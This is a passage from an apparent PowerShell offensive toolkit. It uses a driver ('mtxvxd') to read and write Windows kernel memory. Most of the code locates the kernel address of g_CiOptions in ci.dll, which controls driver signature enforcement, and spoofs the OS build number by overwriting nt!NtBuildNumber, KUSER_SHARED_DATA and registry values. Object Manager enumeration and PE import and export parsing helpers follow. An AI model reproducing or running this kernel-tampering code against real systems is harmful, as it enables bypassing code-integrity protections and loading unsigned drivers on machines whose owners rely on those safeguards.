"@

$compileParams = New-Object System.CodeDom.Compiler.CompilerParameters
$compileParams.ReferencedAssemblies.AddRange(@('System.dll', 'mscorlib.dll'))
$compileParams.GenerateInMemory = $True
Add-Type -TypeDefinition $code -CompilerParameters $compileParams -PassThru -WarningAction SilentlyContinue | Out-Null
}
function Get-gCiOptionsAddress {
    param (
        [Int64]$g_CiOptions = 0
    )

    $ciBaseAddress = Get-DriverAddress -DriverName ci.dll
    if ($ciBaseAddress -eq [IntPtr]::Zero) {
        throw "Could not retrieve runtime kernel base address for ci.dll"
    }

    $FuncAddress = Get-FunctionAddress -DllName ci.dll -FunctionName CiInitialize

    $CiInitialize = $FuncAddress.RVA
    if ($null -eq $CiInitialize) {
        throw "Failed to read CiInitialize bytes from disk."
    }

    $fBufSize = 100; $fBuf = New-Object Byte[] $fBufSize
    $CiInitializeKernelVA = [IntPtr]::Add($ciBaseAddress, $CiInitialize)
    $va = Map-VirtualAddress -VA $CiInitializeKernelVA -BlockSize $fBufSize -DriverName mtxvxd
    if ($va -ne [IntPtr]::Zero) {
        [Marshal]::Copy($va, $fBuf, 0, $fBufSize);
        Unmap-VirtualAddress $va -DriverName mtxvxd | out-null
    } else {
        Write-Error "Failed to map physical/virtual memory window."
    }

    # --- Dynamic Pattern Scan ---
    # We look for the distinct sequence at the end of CiInitialize:
    # 1. mov ecx, ebp  (89 C9 or 89 CE or similar register moves)
    # 2. CALL opcode   (0xE8)
    # 3. [4 bytes relative offset]
    # 4. mov rbx, [rsp+...] (48 8B ...) -> Function teardown
    $callInstructionOffset = -1

    # --- Robust Dynamic Pattern Scan ---
    # Look specifically for the argument restoration/forwarding registers 
    # right before the final CALL to CipInitialize:
    # mov rdx, rsi (48 89 F2) or mov ecx, ebp (89 E9 / 89 ED / 139 205)
    $callInstructionOffset = -1

    # We loop through the buffer looking for the CALL (0xE8) that is 
    # immediately followed by the function epilogue (48 8B 5C 24)
    for ($i = 0; $i -lt ($fBuf.Length - 10); $i++) {
        if ($fBuf[$i] -eq 0xE8) {
            # Check if the instruction following this CALL's payload is the epilogue: mov rbx, [rsp+...]
            if ($fBuf[$i + 5] -eq 0x48 -and $fBuf[$i + 6] -eq 0x8B) {
                $callInstructionOffset = $i
                # Do not break early; keep scanning to ensure we get the LAST call in the function
            }
        }
    }

    if ($callInstructionOffset -ne -1) {
        $relativeOffset = [BitConverter]::ToInt32($fBuf, $callInstructionOffset + 1)
        $nextInstructionRVA = $CiInitialize + $callInstructionOffset + 5
        $CipInitializeRVA = $nextInstructionRVA + $relativeOffset   
    } else {
        throw "Could not dynamically locate the CipInitialize CALL pattern in the byte buffer."
    }

    $fBuf = New-Object Byte[] 100
    $CipInitializeKernelVA = [IntPtr]::Add($ciBaseAddress, $CipInitializeRVA)
    $va = Map-VirtualAddress -VA $CipInitializeKernelVA -BlockSize 100 -DriverName mtxvxd
    if ($va -ne [IntPtr]::Zero) {
        [Marshal]::Copy($va, $fBuf, 0, 100);
        Unmap-VirtualAddress $va -DriverName mtxvxd | out-null
    } else {
        throw "Failed to map physical/virtual memory window."
    }

    $offset = -1
    $instrLen = 0
    $dispStart = 0

    # Loop through the buffer, leaving room for a max instruction size of 7 bytes
    for ($i = 0; $i -lt $fBuf.Length - 7; $i++) {
    
        # CASE 1: Extended Registers (r8d - r15d) -> Prefixed with REX.R (0x44)
        # Byte format: [44] [89] [ModR/M] [4-byte Disp]
        if ($fBuf[$i] -eq 0x44 -and $fBuf[$i+1] -eq 0x89) {
            $modRM = $fBuf[$i+2]
            # Check if ModR/M is a RIP-relative write (0x05, 0x0D, 0x15, 0x1D, 0x25, 0x2D, 0x35, 0x3D)
            if (($modRM -band 0xC7) -eq 0x05) {
                $offset = $i
                $instrLen = 7
                $dispStart = $i + 3
                break
            }
        }

        # CASE 2: Standard Registers (eax - edi)
        # Byte format: [89] [ModR/M] [4-byte Disp]
        if ($fBuf[$i] -eq 0x89) {
            $modRM = $fBuf[$i+1]
            if (($modRM -band 0xC7) -eq 0x05) {
                $offset = $i
                $instrLen = 6
                $dispStart = $i + 2
                break
            }
        }
    }

    if ($offset -eq -1) {
        Write-Error "Could not universally locate the mov cs:g_CiOptions instruction."
        return 0
    }

    # Extract the 4-byte signed displacement universally
    $dispBytes = $fBuf[$dispStart..($dispStart + 3)]
    $disp = [BitConverter]::ToInt32($dispBytes, 0)

    # RIP-relative calculations (Current Instruction Index + Instruction Length + Signed Displacement)
    $nextInstr = [IntPtr]::Add($CipInitializeKernelVA, $offset + $instrLen)
    $gCiOptionsKernelVA = [IntPtr]::Add($nextInstr, $disp)

    try {
        if (0 -ne $g_CiOptions) {            
            $rva = $g_CiOptions - ($FuncAddress.StaticBase)
            return [IntPtr]::Add($ciBaseAddress, $rva)
        }
        return $gCiOptionsKernelVA
    } 
    catch {
        Write-Error "Error parsing Virtual Address context."
    }
    return 0
}
#endregion
#region Helper
function Get-RVA {
    param ([string]$Symbol)
    
    # 1. Load the module into memory to read its headers
    $hModule = Ldr-LoadDll -dwFlags SEARCH_SYS32 -dll ntoskrnl.exe
    $procAddress = [IntPtr]::Zero
    $AnsiPtr = Init-NativeString -Value ($Symbol -split "!")[1] -Encoding Ansi
    
    $Global:ntdll::LdrGetProcedureAddressForCaller($hModule, $AnsiPtr, 0, [ref]$procAddress, 0, 0) | Out-Null
    Free-NativeString -StringPtr $AnsiPtr
    
    # 2. Calculate RVA = (Absolute Address in Process) - (Base Address in Process)
    $ModuleBase = $hModule # This is the base address of the module in your process
    $RVA = $procAddress.ToInt64() - $ModuleBase.ToInt64()
    
    return $RVA
}
function Get-NtBuildNumber {
    $KernelBase = Get-KernelBaseAddress
    
    # 1. Resolve function (PsGetVersion)
    # Using your approach, find the RVA of PsGetVersion
    $PsGetVersionRVA = Get-RVA -Symbol "nt!PsGetVersion" 
    $PsGetVersionVA = [IntPtr]::Add($KernelBase, $PsGetVersionRVA)
    
    # 2. Map the memory buffer
    $fBuf = New-Object Byte[] 120
    $va = Map-VirtualAddress -VA $PsGetVersionVA -BlockSize 100 -DriverName mtxvxd
    [Marshal]::Copy($va, $fBuf, 0, 120)
    Unmap-VirtualAddress $va -DriverName mtxvxd | Out-Null

    # ==========================================
    # 3. Dynamic RIP-Relative Scan (Universal Fix)
    # ==========================================
    # Matches both Windows 10 & 11 by ensuring we grab the final validation block
    $offset = -1
    $instrLen = 6 # Opcode 8B 05 (2) + 4-byte displacement (4)
    
    for ($i = 0; $i -lt ($fBuf.Length - 9); $i++) {
        # 1. Identify the 'MOV EAX, [RIP + Disp]' Opcode
        if ($fBuf[$i] -eq 0x8B -and $fBuf[$i+1] -eq 0x05) {
            
            # 2. Look-Ahead Check: Is this followed closely by the AND mask ('25')?
            # Win11 matches at +6. Win10 or alternative compilations can fall at +7 or +8 due to prefixes.
            if ($fBuf[$i+6] -eq 0x25 -or $fBuf[$i+7] -eq 0x25 -or $fBuf[$i+8] -eq 0x25) {
                $offset = $i
                break # Found the correct verification instruction block, exit loop
            }
        }
    }

    if ($offset -eq -1) {
        throw "Could not locate the correct validation-block NtBuildNumber MOV instruction."
    }

    if ($offset -eq -1) {
        throw "Could not locate NtBuildNumber MOV instruction."
    }

    # 4. Universal Displacement Extraction
    $disp = [BitConverter]::ToInt32($fBuf, $offset + 2)

    # 5. RIP-Relative calculation
    # Address = Next Instruction Address + Signed Displacement
    $nextInstr = [IntPtr]::Add($PsGetVersionVA, $offset + $instrLen)
    $NtBuildNumberVA = [IntPtr]::Add($nextInstr, $disp)

    # 6. Read and Display
    $BuildNumBytes = Read-VirtualAddress -VA $NtBuildNumberVA -BlockSize 4
    if ($BuildNumBytes) {
        $BuildNum = [BitConverter]::ToUInt32($BuildNumBytes, 0)
        $ActualBuildNumber = $BuildNum -band 0xFFFF
        return [PsObject]@{
            VA          = $NtBuildNumberVA
            BuildNumber = $ActualBuildNumber
        }
    } else {
        Write-Error "Failed to read memory at target VA."
    }
}
function Set-NtBuildNumber {
    param (
        [int]$NewBuildNumber
    )

    # 1. Get the current VA and current Raw Value
    $Info = Get-NtBuildNumber
    $TargetVA = $Info.VA
    
    # Read the current 4 bytes from kernel memory
    $RawBytes = Read-VirtualAddress -VA $TargetVA -BlockSize 4
    if (-not $RawBytes) { throw "Failed to read target memory." }
    
    $RawValue = [BitConverter]::ToUInt32($RawBytes, 0)
    
    # 2. Separate Flags from Version
    # Keep the high 16 bits (Flags) and replace the low 16 bits (Build Number)
    $Flags = $RawValue -band 0xFFFF0000
    $SpoofedValue = $Flags -bor ($NewBuildNumber -band 0xFFFF)
    
    # 3. Apply the Spoof
    $Bytes = [BitConverter]::GetBytes($SpoofedValue)
    
    Write-Host "Current Raw Value: 0x$($RawValue.ToString('X'))" -ForegroundColor Gray
    Write-Host "Writing Spoofed Value: 0x$($SpoofedValue.ToString('X'))" -ForegroundColor Yellow
    
    # Assuming your mtxvxd driver exposes a write function
    $Result = Write-VirtualAddress -VA $TargetVA -Value $Bytes
    
    if ($Result) {
        Write-Host "Success: NtBuildNumber spoofed to $NewBuildNumber" -ForegroundColor Green
    } else {
        Write-Error "Failed to write memory. Ensure the driver has write permissions."
    }
}
function Spoof-NtBuildNumber {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $false)]
        [int]$NewBuildNumber = 0,

        [Parameter(Mandatory = $false)]
        [ValidateSet("All", "Registry", "Kernel", "KUser")]
        [String]$SpoofLevel = "All"
    )

    $RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
    $KUserSharedKernelVA = 0xFFFFF78000000260

    # ==========================================
    # MODE 1: GET
    # ==========================================
    if ($NewBuildNumber -eq 0) {
        # Layer 1: Read User-Mode Shared Page (KUSER_SHARED_DATA)
        $UserSharedBuild = [Marshal]::ReadInt32([IntPtr](0x7FFE0000 + 0x0260))

        # Layer 2: Read Internal Kernel Module (via your scanning logic)
        $KernelInfo = Get-NtBuildNumber
        $KernelBuild = $KernelInfo.BuildNumber
        $KernelVA = $KernelInfo.VA

        # Layer 3: Read Registry values
        $RegCurrentBuild = (Get-ItemProperty -Path $RegPath -Name "CurrentBuild" -ErrorAction SilentlyContinue).CurrentBuild
        $RegCurrentBuildNum = (Get-ItemProperty -Path $RegPath -Name "CurrentBuildNumber" -ErrorAction SilentlyContinue).CurrentBuildNumber

        return [PsObject]@{
            UserSharedPageBuild = $UserSharedBuild
            KernelModuleBuild   = $KernelBuild
            KernelVariableVA    = $KernelVA
            RegistryBuildString = $RegCurrentBuild
            RegistryBuildNumber = $RegCurrentBuildNum
        }
    }

    # ==========================================
    # MODE 2: SET
    # ==========================================
    if (-not $PSBoundParameters.ContainsKey('NewBuildNumber')) {
        throw "A target -NewBuildNumber must be specified when using 'Set' mode."
    }

    Write-Host "[*] Initializing Pipeline | Target: $NewBuildNumber | Level: $SpoofLevel" -ForegroundColor Cyan
    Write-Host "--------------------------------------------------------" -ForegroundColor Gray

    # --- LEVEL: KUser / All ---
    if ($SpoofLevel -eq "All" -or $SpoofLevel -eq "KUser") {
        $ShortBytes = [BitConverter]::GetBytes([Int16]$NewBuildNumber)
        $UserWrite = Write-VirtualAddress -VA $KUserSharedKernelVA -Value $ShortBytes
        if ($UserWrite) {
            Write-Host "[+] SUCCESS: KUSER_SHARED_DATA master page updated." -ForegroundColor Green
        } else {
            Write-Warning "[-] FAILURE: Unable to modify KUSER_SHARED_DATA page."
        }
    }

    # --- LEVEL: Kernel / All ---
    if ($SpoofLevel -eq "All" -or $SpoofLevel -eq "Kernel") {
        try {
            Set-NtBuildNumber -NewBuildNumber $NewBuildNumber
        } catch {
            Write-Warning "[-] FAILURE: Exception occurred updating nt!NtBuildNumber: $_"
        }
    }

    # --- LEVEL: Registry / All ---
    if ($SpoofLevel -eq "All" -or $SpoofLevel -eq "Registry") {
        $StringBuild = [string]$NewBuildNumber
        try {
            Set-ItemProperty -Path $RegPath -Name "CurrentBuild" -Value $StringBuild -Force | Out-Null
            Set-ItemProperty -Path $RegPath -Name "CurrentBuildNumber" -Value $StringBuild -Force | Out-Null
            Write-Host "[+] SUCCESS: Registry strings synchronized." -ForegroundColor Green
        } catch {
            Write-Warning "[-] FAILURE: Missing elevated permissions for registry modification."
        }
    }

    Write-Host "--------------------------------------------------------" -ForegroundColor Gray
    Write-Host "[*] Custom Target Execution Pipeline Terminated." -ForegroundColor Cyan
}
function Get-ObjectManagerDirectory {
    <#
    .SYNOPSIS
        Enumerates objects within a specific Windows Object Manager directory.
    .EXAMPLE
        Get-ObjectManagerDirectory -Path "\"
    .EXAMPLE
        Get-ObjectManagerDirectory -Path "\Device"
    .EXAMPLE
        Get-ObjectManagerDirectory -Path "\GLOBAL??"
    #>
    [CmdletBinding()]
    param (
        [ValidateSet(
        'Device', 'GLOBAL', 'PendingRenameMutex', 'ObjectTypes', 
        'storqosfltport', 'SystemRoot', 'Sessions', 
        'ArcName', 'WcifsPort', 'NLS', 'LanmanServerAnnounceEvent', 
        'ThemeApiPort', 'Windows', 'RPCControl',
        'PdcPort', 'EFSInitEvent', 'Dfs', 'clfs',
        'CsrSbSyncEvent', 'SeRmCommandPort', 'DosDevices',
        'KnownDlls32', 'REGISTRY', 'BaseNamedObjects',
        'Win32kCrossSessionGlobals', 'PowerPort',
        'SmSsWinStationApiPort', 'UniqueInteractiveSessionIdEvent', 
        'UMDFCommunicationPorts', 'KnownDlls', 'FatCdrom',
        'Fat', 'PowerMonitorPort', 'DSYSDBG.Debug.Trace.Memory.2f0',
        'Ntfs', 'FileSystem', 'KernelObjects', 'SeLsaCommandPort', 
        'Callback', 'BindFltPort', 'Security', 'DriverData',
        'LsaPerformance', 'SmApiPort', 'CLDMSGPORT', 'OSDataRoot',
        'SAM_SERVICE_STARTED', 'Driver', 'DriverStores'
        )]
        [string]$Path = "GLOBAL"
    )

    if (-not ([PSTypeName]'OBJECT_ATTRIBUTES').Type) {
    
        # Run this ONCE to capture the true [Reflection.Emit.ModuleBuilder] context
        $Win32Module = New-InMemoryModule -ModuleName "Win32"

        New-Struct `
            -Module $Win32Module `
            -FullName "OBJECT_ATTRIBUTES" `
            -StructFields @{
                Length                   = New-Field 0 "Int32"
                RootDirectory            = New-Field 1 "IntPtr"
                ObjectName               = New-Field 2 "IntPtr"
                Attributes               = New-Field 3 "Int32"
                SecurityDescriptor       = New-Field 4 "IntPtr"
                SecurityQualityOfService = New-Field 5 "IntPtr"
            } | Out-Null

        New-Struct `
            -Module $Win32Module `
            -FullName "UNICODE_STRING" `
            -StructFields @{
                Length        = New-Field 0 "Int16"
                MaximumLength = New-Field 1 "Int16"
                Buffer        = New-Field 2 "IntPtr"
            } | Out-Null

        New-Struct `
            -Module $Win32Module `
            -FullName "OBJECT_DIRECTORY_INFORMATION" `
            -StructFields @{
                Name_Length             = New-Field 0 "Int16"
                Name_MaximumLength      = New-Field 1 "Int16"
                Name_Buffer             = New-Field 2 "IntPtr"
                TypeName_Length         = New-Field 3 "Int16"
                TypeName_MaximumLength  = New-Field 4 "Int16"
                TypeName_Buffer         = New-Field 5 "IntPtr"
            } | Out-Null
    }
    try {
        $Module = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule.ScopeName -eq "WIN32_NT" } | Select-Object -Last 1
        $WIN32_NT = $Module.GetTypes()[0]
    }
    catch {
        $Module = [AppDomain]::CurrentDomain.DefineDynamicAssembly("null", 1).DefineDynamicModule("WIN32_NT", $False).DefineType("null")
        @(
            @('null', 'null', [int], @()), 
            @('NtOpenDirectoryObject',  'ntdll.dll', [Int], @([IntPtr].MakeByRefType(), [UInt32], [Intptr])),
            @('NtQueryDirectoryObject', 'ntdll.dll', [Int], @([IntPtr], [IntPtr], [UInt32], [Bool], [Bool], [UInt32].MakeByRefType(), [UInt32].MakeByRefType())),
            @('NtClose',                'ntdll.dll', [Int], @([IntPtr])),
            @('RtlInitUnicodeString',   'ntdll.dll', [Void], @([IntPtr], [String]))
        ) | ForEach-Object {
            $Module.DefinePInvokeMethod(($_[0]), ($_[1]), 22, 1, [Type]($_[2]), [Type[]]($_[3]), 1, 3).SetImplementationFlags(128)
        }
        $WIN32_NT = $Module.CreateType()
    }

    # 3. Memory Allocation and Namespace Query Execution
    try {
        # Instantiate instances directly via type accelerators
        $usName = [Activator]::CreateInstance('UNICODE_STRING')
        $attr   = [Activator]::CreateInstance('OBJECT_ATTRIBUTES')

        $pUsName = [Marshal]::AllocHGlobal([Marshal]::SizeOf([Type]'UNICODE_STRING'))
        switch ($Path) {
            "PendingRenameMutex" { $val = "\PendingRenameMutex"}
            "ObjectTypes" { $val = "\ObjectTypes"}
            "storqosfltport" { $val = "\storqosfltport"}
            "SystemRoot" { $val = "\SystemRoot"}
            "Sessions" { $val = "\Sessions"}
            "ArcName" { $val = "\ArcName"}
            "WcifsPort" { $val = "\WcifsPort"}
            "NLS" { $val = "\NLS"}
            "LanmanServerAnnounceEvent" { $val = "\LanmanServerAnnounceEvent"}
            "ThemeApiPort" { $val = "\ThemeApiPort"}
            "Windows" { $val = "\Windows"}
            "GLOBAL" { $val = "\GLOBAL??"}
            "RPCControl" { $val = "\RPCControl"}
            "PdcPort" { $val = "\PdcPort"}
            "EFSInitEvent" { $val = "\EFSInitEvent"}
            "Dfs" { $val = "\Dfs"}
            "clfs" { $val = "\clfs"}
            "CsrSbSyncEvent" { $val = "\CsrSbSyncEvent"}
            "SeRmCommandPort" { $val = "\SeRmCommandPort"}
            "DosDevices" { $val = "\DosDevices"}
            "KnownDlls32" { $val = "\KnownDlls32"}
            "REGISTRY" { $val = "\REGISTRY"}
            "BaseNamedObjects" { $val = "\BaseNamedObjects"}
            "Win32kCrossSessionGlobals" { $val = "\Win32kCrossSessionGlobals"}
            "PowerPort" { $val = "\PowerPort"}
            "SmSsWinStationApiPort" { $val = "\SmSsWinStationApiPort"}
            "UniqueInteractiveSessionIdEvent" { $val = "\UniqueInteractiveSessionIdEvent"}
            "UMDFCommunicationPorts" { $val = "\UMDFCommunicationPorts"}
            "KnownDlls" { $val = "\KnownDlls"}
            "FatCdrom" { $val = "\FatCdrom"}
            "Fat" { $val = "\Fat"}
            "PowerMonitorPort" { $val = "\PowerMonitorPort"}
            "DSYSDBG.Debug.Trace.Memory.2f0" { $val = "\DSYSDBG.Debug.Trace.Memory.2f0"}
            "Ntfs" { $val = "\Ntfs"}
            "FileSystem" { $val = "\FileSystem"}
            "KernelObjects" { $val = "\KernelObjects"}
            "SeLsaCommandPort" { $val = "\SeLsaCommandPort"}
            "Callback" { $val = "\Callback"}
            "BindFltPort" { $val = "\BindFltPort"}
            "Security" { $val = "\Security"}
            "Device" { $val = "\Device"}
            "DriverData" { $val = "\DriverData"}
            "LsaPerformance" { $val = "\LsaPerformance"}
            "SmApiPort" { $val = "\SmApiPort"}
            "CLDMSGPORT" { $val = "\CLDMSGPORT"}
            "OSDataRoot" { $val = "\OSDataRoot"}
            "SAM_SERVICE_STARTED" { $val = "\SAM_SERVICE_STARTED"}
            "Driver" { $val = "\Driver"}
            "DriverStores" { $val = "\DriverStores"}
        }
        $WIN32_NT::RtlInitUnicodeString($pUsName, $val)

        $attr.Length                    = [Marshal]::SizeOf([Type]'OBJECT_ATTRIBUTES')
        $attr.RootDirectory             = [IntPtr]::Zero
        $attr.ObjectName                = $pUsName
        $attr.Attributes                = 0x40 # OBJ_CASE_INSENSITIVE
        $attr.SecurityDescriptor        = [IntPtr]::Zero
        $attr.SecurityQualityOfService  = [IntPtr]::Zero
        $attribPtr = New-IntPtr -Object $attr

        $dirHandle = [IntPtr]::Zero
        $status = $WIN32_NT::NtOpenDirectoryObject([ref]$dirHandle, 0x0001, $attribPtr)

        [Marshal]::FreeHGlobal($pUsName)
        [Marshal]::FreeHGlobal($attribPtr)

        if ($status -ne 0) {
            throw "Failed to open directory object. NTSTATUS: 0x$($status.ToString('X'))"
        }

        $bufSize = [UInt32](512 * 1024)
        $buffer  = [Marshal]::AllocHGlobal([Int]$bufSize)
        $context = [UInt32]0
        $retLen  = [UInt32]0

        $status = $WIN32_NT::NtQueryDirectoryObject($dirHandle, $buffer, $bufSize, $False, $True, [ref]$context, [ref]$retLen)

        if ($status -eq 0) {
            $currentEntry = $buffer
            $structSize = [Marshal]::SizeOf([Type]'OBJECT_DIRECTORY_INFORMATION')

            while ($True) {
                $info = [OBJECT_DIRECTORY_INFORMATION]$currentEntry
                if ($info.Name_Buffer -eq [IntPtr]::Zero) { break }

                $name = [Marshal]::PtrToStringUni($info.Name_Buffer, [Int]($info.Name_Length / 2))
                $type = [Marshal]::PtrToStringUni($info.TypeName_Buffer, [Int]($info.TypeName_Length / 2))

                [PSCustomObject]@{
                    Name = $name
                    Type = $type
                    Path = if ($Path -eq "\") { "\$name" } else { "$Path\$name" }
                }
                $currentEntry = [IntPtr]::Add($currentEntry, $structSize)
            }
        }

        [Marshal]::FreeHGlobal($buffer)
        $null = $WIN32_NT::NtClose($dirHandle)

    } catch {
        Write-Error $_.Exception.Message
    }
}
function Get-FunctionAddress {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]$DllName,

        [Parameter(Mandatory = $true)]
        [string]$FunctionName,

        [Parameter(Mandatory = $false)]
        [int]$BytesToRead = 25
    )

    function Convert-RVAToFileOffset([int]$Rva, [PSObject[]]$SectionHeaders) {
        foreach ($Section in $SectionHeaders) {
            if ($Rva -ge $Section.VirtualAddress -and $Rva -lt ($Section.VirtualAddress + $Section.VirtualSize)) {
                return $Rva - $Section.VirtualAddress + $Section.PointerToRawData
            }
        }
        return $Rva
    }

    $DllPath = Join-Path -Path $env:windir -ChildPath "System32\$DllName"

    if (-not (Test-Path $DllPath)) {
        Write-Error "DLL file not found at: $DllPath"
        return $null
    }

    $FileByteArray = [System.IO.File]::ReadAllBytes($DllPath)
    $Handle = [GCHandle]::Alloc($FileByteArray, 'Pinned')
    $PEBaseAddr = $Handle.AddrOfPinnedObject()

    try {
        # Parse DOS header
        $DosHeader = [Marshal]::PtrToStructure($PEBaseAddr, [Type] [PE+_IMAGE_DOS_HEADER])
        $PointerNtHeader = [IntPtr]($PEBaseAddr.ToInt64() + $DosHeader.e_lfanew)

        # Detect architecture
        $NtHeader32 = [Marshal]::PtrToStructure($PointerNtHeader, [Type] [PE+_IMAGE_NT_HEADERS32])
        $Architecture = $NtHeader32.FileHeader.Machine.ToString()
        $PEStruct = @{}

        if ($Architecture -eq 'AMD64') {
            $PEStruct['NT_HEADER'] = [PE+_IMAGE_NT_HEADERS64]
        } elseif ($Architecture -eq 'I386') {
            $PEStruct['NT_HEADER'] = [PE+_IMAGE_NT_HEADERS32]
        } else {
            Write-Error "Unsupported architecture: $Architecture"
            return $null
        }

        # Parse correct NT header
        $NtHeader = [Marshal]::PtrToStructure($PointerNtHeader, [Type] $PEStruct['NT_HEADER'])
        $NumSections = $NtHeader.FileHeader.NumberOfSections

        # Parse section headers
        $PointerSectionHeader = [IntPtr] ($PointerNtHeader.ToInt64() + [Marshal]::SizeOf([Type] $PEStruct['NT_HEADER']))
        $SectionHeaders = New-Object PSObject[]($NumSections)
        for ($i = 0; $i -lt $NumSections; $i++) {
            $SectionHeaders[$i] = [Marshal]::PtrToStructure(
                [IntPtr]($PointerSectionHeader.ToInt64() + ($i * [Marshal]::SizeOf([Type] [PE+_IMAGE_SECTION_HEADER]))),
                [Type] [PE+_IMAGE_SECTION_HEADER]
            )
        }

        # Check for exports
        if ($NtHeader.OptionalHeader.DataDirectory[0].VirtualAddress -eq 0) {
            Write-Error "Module does not contain any exports."
            return $null
        }

        # Get Export Directory
        $ExportDirRVA = $NtHeader.OptionalHeader.DataDirectory[0].VirtualAddress
        $ExportDirOffset = Convert-RVAToFileOffset -Rva $ExportDirRVA -SectionHeaders $SectionHeaders
        $ExportDirectory = [Marshal]::PtrToStructure(
            [IntPtr]($PEBaseAddr.ToInt64() + $ExportDirOffset),
            [Type] [PE+_IMAGE_EXPORT_DIRECTORY]
        )

        # Export table pointers
        $AddressOfNamesOffset        = Convert-RVAToFileOffset -Rva $ExportDirectory.AddressOfNames        -SectionHeaders $SectionHeaders
        $AddressOfNameOrdinalsOffset = Convert-RVAToFileOffset -Rva $ExportDirectory.AddressOfNameOrdinals -SectionHeaders $SectionHeaders
        $AddressOfFunctionsOffset    = Convert-RVAToFileOffset -Rva $ExportDirectory.AddressOfFunctions    -SectionHeaders $SectionHeaders

        # Loop through exported names to find the function
        for ($i = 0; $i -lt $ExportDirectory.NumberOfNames; $i++) {
            $nameRVA = [Marshal]::ReadInt32([IntPtr]($PEBaseAddr.ToInt64() + $AddressOfNamesOffset + ($i * 4)))
            $funcNameOffset = Convert-RVAToFileOffset -Rva $nameRVA -SectionHeaders $SectionHeaders
            $funcName = [Marshal]::PtrToStringAnsi([IntPtr]($PEBaseAddr.ToInt64() + $funcNameOffset))

            if ($funcName -eq $FunctionName) {
                $ordinal = [Marshal]::ReadInt16([IntPtr]($PEBaseAddr.ToInt64() + $AddressOfNameOrdinalsOffset + ($i * 2)))
                $funcRVA = [Marshal]::ReadInt32([IntPtr]($PEBaseAddr.ToInt64() + $AddressOfFunctionsOffset + ($ordinal * 4)))

                # Skip forwarded exports
                if ($funcRVA -ge $ExportDirRVA -and $funcRVA -lt ($ExportDirRVA + $NtHeader.OptionalHeader.DataDirectory[0].Size)) {
                    Write-Error "Function '$FunctionName' is a forwarded export and cannot be read."
                    return $null
                }

                # Get file offset and extract bytes
                $funcFileOffset = Convert-RVAToFileOffset -Rva $funcRVA -SectionHeaders $SectionHeaders
                if ($funcFileOffset -ge $FileByteArray.Length) {
                    Write-Error "Function RVA points outside the file. Cannot read bytes."
                    return $null
                }

                $bytesAvailable = $FileByteArray.Length - $funcFileOffset
                if ($BytesToRead -gt $bytesAvailable) {
                    $BytesToRead = $bytesAvailable
                    Write-Warning "Read would go beyond file size. Reading to end of file ($BytesToRead bytes)."
                }

                $funcBytes = $FileByteArray[$funcFileOffset..($funcFileOffset + $BytesToRead - 1)]
                return [PSCustomObject]@{
                    Name        = $FunctionName
                    RVA         = $funcRVA
                    FileOffset  = $funcFileOffset
                    Bytes       = $funcBytes
                    StaticBase   = "0x{0:X}" -f $NtHeader.OptionalHeader.ImageBase
                }
            }
        }

        Write-Error "Function '$FunctionName' not found in DLL."
        return $null
    } finally {
        $Handle.Free()
    }
}
function Get-Imports {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]$DllName
    )

    function Convert-RVAToFileOffset([int64]$Rva, [PSObject[]]$SectionHeaders) {
        foreach ($Section in $SectionHeaders) {
            $SecVA   = [int64][uint32]$Section.VirtualAddress
            $SecSize = [int64][uint32]$Section.VirtualSize
            $RawPtr  = [int64][uint32]$Section.PointerToRawData

            if ($Rva -ge $SecVA -and $Rva -lt ($SecVA + $SecSize)) {
                return $Rva - $SecVA + $RawPtr
            }
        }
        return $Rva
    }

    $DllPath = $DllName
    if (-not (Test-Path $DllPath)) {
        $DllPath = Join-Path -Path $env:windir -ChildPath "System32\$DllName"
    }

    if (-not (Test-Path $DllPath)) {
        Write-Error "DLL file not found at: $DllPath"
        return $null
    }

    $FileByteArray = [System.IO.File]::ReadAllBytes($DllPath)
    $Handle = [GCHandle]::Alloc($FileByteArray, 'Pinned')
    $PEBaseAddr = $Handle.AddrOfPinnedObject()

    $ImportList = [System.Collections.Generic.List[PSCustomObject]]::new()

    try {
        # 1. Parse DOS Header
        $DosHeader = [Marshal]::PtrToStructure($PEBaseAddr, [Type] [PE+_IMAGE_DOS_HEADER])
        $NtHeaderLong = $PEBaseAddr.ToInt64() + $DosHeader.e_lfanew
        $PointerNtHeader = [IntPtr]$NtHeaderLong

        # 2. Detect Architecture & Select Struct
        $NtHeader32 = [Marshal]::PtrToStructure($PointerNtHeader, [Type] [PE+_IMAGE_NT_HEADERS32])
        $Architecture = $NtHeader32.FileHeader.Machine.ToString()
        
        $Is64Bit = $false
        if ($Architecture -eq 'AMD64' -or $Architecture -eq '267' -or $Architecture -eq '0x8664') {
            $NtHeaderType = [PE+_IMAGE_NT_HEADERS64]
            $Is64Bit = $true
        } elseif ($Architecture -eq 'I386' -or $Architecture -eq '332' -or $Architecture -eq '0x014c') {
            $NtHeaderType = [PE+_IMAGE_NT_HEADERS32]
        } else {
            Write-Error "Unsupported architecture: $Architecture"
            return $null
        }

        # Parse correct NT header
        $NtHeader = [Marshal]::PtrToStructure($PointerNtHeader, [Type] $NtHeaderType)
        $NumSections = $NtHeader.FileHeader.NumberOfSections

        # Explicit Section Header Calculation
        $SizeOfOptionalHeader = $NtHeader.FileHeader.SizeOfOptionalHeader
        $PointerSectionHeader = [IntPtr]($NtHeaderLong + 4 + 20 + $SizeOfOptionalHeader)

        # 3. Parse Section Headers
        $SectionHeaders = New-Object PSObject[]($NumSections)
        $SectionHeaderSize = [Marshal]::SizeOf([Type] [PE+_IMAGE_SECTION_HEADER])
        for ($i = 0; $i -lt $NumSections; $i++) {
            $SectionHeaders[$i] = [Marshal]::PtrToStructure(
                [IntPtr]($PointerSectionHeader.ToInt64() + ($i * $SectionHeaderSize)),
                [Type] [PE+_IMAGE_SECTION_HEADER]
            )
        }

        # 4. Check for Import Data Directory (Index 1)
        $ImportDirRVA = [int64][uint32]$NtHeader.OptionalHeader.DataDirectory[1].VirtualAddress
        if ($ImportDirRVA -eq 0) {
            Write-Warning "Module does not contain an Import Directory."
            return @()
        }

        $ImportDirOffset = Convert-RVAToFileOffset -Rva $ImportDirRVA -SectionHeaders $SectionHeaders
        $DescriptorSize = [Marshal]::SizeOf([Type][PE+_IMAGE_IMPORT_DESCRIPTOR])
        $CurrentImportDescriptorOffset = $ImportDirOffset

        # Loop through each dependency block (Import Descriptor)
        while ($true) {
